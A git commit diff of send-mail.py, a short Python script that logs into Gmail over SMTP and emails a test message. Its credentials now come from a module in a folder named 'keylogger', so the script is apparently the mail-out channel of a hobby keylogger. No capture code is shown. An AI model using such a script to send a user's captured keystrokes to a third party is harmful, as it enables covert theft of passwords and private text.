90991ad052f1934e1e9efc36cba5fa2237bf82fb
ates-kuresi <ateskuresiz@gmail.com>
2021-09-17 17:15:27 +0300

    Update send-mail.py

--- send-mail.py
+++ send-mail.py
@@ -5,10 +5,12 @@ from email.mime.base import MIMEBase
 from email import encoders
 from email.mime.multipart import MIMEMultipart
 from email.mime.application import MIMEApplication
-from myMailAuth import * # This is for hide my informations
+import sys
+sys.path.insert(1, 'C:/Users/brkem/Desktop/keylogger')
+import idemail
 
 
-sender = myMail
+sender = idemail.myMail
 recievers = ['ateskuresiz@gmail.com', '']
 body_of_email = 'emaildeki yazi deneme'
 
@@ -19,6 +21,6 @@ msg['To'] = ','.join(recievers)
 
 
 s = smtplib.SMTP_SSL(host = 'smtp.gmail.com', port= 465)
-s.login(user = sender, password= myPasswd)
+s.login(user = sender, password= idemail.myPass)
 s.sendmail(sender, recievers, msg.as_string())
 s.quit()
